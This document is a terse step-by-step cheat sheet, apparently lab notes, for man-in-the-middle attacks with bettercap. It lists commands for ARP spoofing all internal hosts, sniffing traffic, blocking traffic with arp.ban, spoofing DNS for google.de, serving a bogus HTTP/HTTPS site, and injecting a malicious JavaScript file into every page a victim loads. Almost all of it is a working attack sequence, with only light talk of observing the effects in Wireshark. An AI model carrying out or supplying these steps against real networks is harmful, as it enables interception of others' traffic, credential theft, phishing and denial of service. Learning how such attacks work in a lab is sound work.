Some remarks about the notation: ```>``` denotes a command being entered inside buttercup, whereas ```#``` denotes a command being entered in a shell.

- On a machine in your network (i.e. the one you are attacking): watch your local arp cache for changes: ```# watch -n 1 "arp -a"```
- Open bettercap: ```# sudo bettercap```
- See the nothing is running: ```> help```
- Turn on netoworking reconnaissance: ```> net.recon on```
- See hosts on the network: ```> net.show```
- Get information about the arp spoof module: ```> help arp.spoof```
- Get all variables related to the arp spoof module: ```> get arp.spoof.*```
- We want to spoof all internal connections: ```> set arp.spoof.internal true```
- Start arp spoofing: ```> arp.spoof on```
- On machine which is attacked, watch arp table being filled
- Open Wireshark and show network traffic: ```# sudo wireshark```
  - See ARP traffic by filtering for it inside wireshark (```arp```)
  - See non ARP traffic (```not arp```)
  - See HTTP traffic (```http```)
- See traffic increase: ```# nload -t 1000```
- Now we know: all traffic goes through us! We win and can do whatever we want now
- Now let's sniff the traffic: ```> net.sniff on```
- Stop it again: ```> net.sniff off```
- Stop arp spoofing for now: ```> arp.spoof off```
- ```> arp.ban on``` when you are really pissed, no traffic gets forwarded
- Turn forwarding back on again: ```> arp.ban off``` and ```> arp.spoof on```
- Let's spoof domains: ```> set dns.spoof.domains google.de``` and ```> dns.spoof on```
- On the a machine in your network: ```# watch -n 1 "host google.de"```
- Sometimes this doesn't work an the real gateway is faster: ```> arp.spoof off``` and ```> arp.ban on```
- Start a bogous HTTP webserver: ```> set http.server.path ./google``` and ```> set https.server.path ./google``` and ```> http.server on``` and ```> https.server on```
- Stop everything: ```> arp.ban off``` and ```> dns.spoof off``` and ```> http.server off``` and ```> https.server off```
- Now inject a malicious JavaScript file into every page: ```> arp.spoof on``` and ```> set http.proxy.injectjs inject.js``` and ```> set https.proxy.injectjs inject.js``` and ```> http.proxy on``` and ```> https.proxy on```
- Navigate to spiegel.de in a browser on a machine on your network
